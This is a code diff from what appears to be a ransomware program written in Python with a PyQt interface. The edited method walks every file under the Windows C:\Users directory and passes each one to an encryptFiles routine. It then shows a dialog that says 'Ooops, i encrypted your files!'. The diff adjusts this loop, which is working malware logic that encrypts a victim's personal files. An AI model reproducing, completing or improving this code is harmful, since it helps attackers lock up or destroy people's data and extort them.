@@ -58,13 +58,12 @@ class myApp(QtWidgets.QMainWindow):
 
     def windowsSysEncrypted(self):
         os.getcwd()
-        os.chdir("C:\\")
+        os.chdir('C:\\')
              
-        for dirpath, dirname, filenames in os.walk(os.getcwd() + "\\Users"):
-            if filenames:
-                for _file in filenames:                   
-                    location = dirpath + "\\" + _file 
-                    self.encryptFiles(location=location)
+        for dirpath, dirname, filenames in os.walk(os.getcwd() + "/Users"):
+            for _file in filenames:                   
+                location = dirpath + "\\" + _file 
+                self.encryptFiles(location=location)
         self.showDialog("WARNING!", "Ooops, i encrypted your files!")
 
     def encryptFiles(self, location):
